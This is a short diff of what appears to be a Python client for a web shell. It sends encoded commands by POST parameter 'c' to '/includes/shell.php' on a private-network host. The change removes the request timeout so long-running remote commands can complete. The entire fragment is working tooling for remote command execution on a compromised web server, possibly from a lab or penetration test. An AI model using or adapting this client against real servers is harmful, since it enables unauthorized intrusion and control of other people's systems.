@@ -6,7 +6,7 @@ import requests
 SCHEME = "http"
 HOST = "10.143.4.133"
 PATH = "/includes/shell.php"
-TIMEOUT = 120
+TIMEOUT = None
 SEPARATOR = "=" * 60
 SUB_SEPARATOR = "-" * 60
 
@@ -24,7 +24,10 @@ def send_command(cmd: str) -> Tuple[str, Optional[int]]:
     encoded = encode_cmd(cmd)
     url = build_url()
     try:
-        res = requests.post(url, data={"c": encoded}, timeout=TIMEOUT)
+        if TIMEOUT is None:
+            res = requests.post(url, data={"c": encoded})
+        else:
+            res = requests.post(url, data={"c": encoded}, timeout=TIMEOUT)
     except requests.exceptions.Timeout:
         return "request timed out", None
     except requests.exceptions.ConnectionError:
